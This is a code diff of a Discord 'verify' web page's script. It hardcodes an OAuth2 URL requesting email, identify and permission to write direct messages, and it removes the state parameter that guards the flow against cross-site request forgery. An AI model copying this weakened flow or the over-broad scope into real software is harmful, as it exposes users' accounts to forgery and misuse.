@@ -117,16 +117,10 @@
     </div>
 
     <script>
-        const CLIENT_ID = '1410730325893578802';
-        const REDIRECT_PATH = '/oauth2/callback';
-        const SCOPES = 'email identify dm_channels.messages.write';
+        // رابط OAuth2 المطلوب
+        const OAUTH_URL = 'https://discord.com/oauth2/authorize?client_id=1410730325893578802&response_type=code&redirect_uri=https%3A%2F%2Fyazna33.github.io%2Fverifybot4O4%2F&scope=email+identify+dm_channels.messages.write';
 
         let isVerifying = false;
-
-        function generateState() {
-            return Math.random().toString(36).substring(2, 18) + 
-                   Math.random().toString(36).substring(2, 18);
-        }
 
         async function verify() {
             if (isVerifying) return;
@@ -140,19 +134,13 @@
             status.textContent = '🔄 Redirecting to Discord...';
 
             try {
-                const redirectUri = window.location.origin + REDIRECT_PATH;
-                const state = generateState();
-                const oauthUrl = `https://discord.com/oauth2/authorize?client_id=1410730325893578802&response_type=code&redirect_uri=https%3A%2F%2Fyazna33.github.io%2Fverifybot4O4%2F&scope=email+identify+dm_channels.messages.write`;
-                
-                localStorage.setItem('oauth_state', state);
-                
                 status.className = 'status success';
                 status.textContent = '✅ Redirecting to Discord...';
                 btn.className = 'btn success';
                 btn.textContent = '✅ Redirecting...';
                 
                 setTimeout(() => {
-                    window.location.href = oauthUrl;
+                    window.location.href = OAUTH_URL;
                 }, 1000);
                 
             } catch (error) {
@@ -164,7 +152,7 @@
             }
         }
 
-        // معالجة OAuth2 Callback
+        // معالجة OAuth2 Callback (إذا عاد المستخدم مع code)
         async function handleOAuth2Callback() {
             const params = new URLSearchParams(window.location.search);
             const code = params.get('code');
@@ -193,8 +181,6 @@
                     document.getElementById('status').className = 'status error';
                     document.getElementById('status').textContent = '❌ Server error.';
                 }
-                
-                localStorage.removeItem('oauth_state');
             }
         }
 
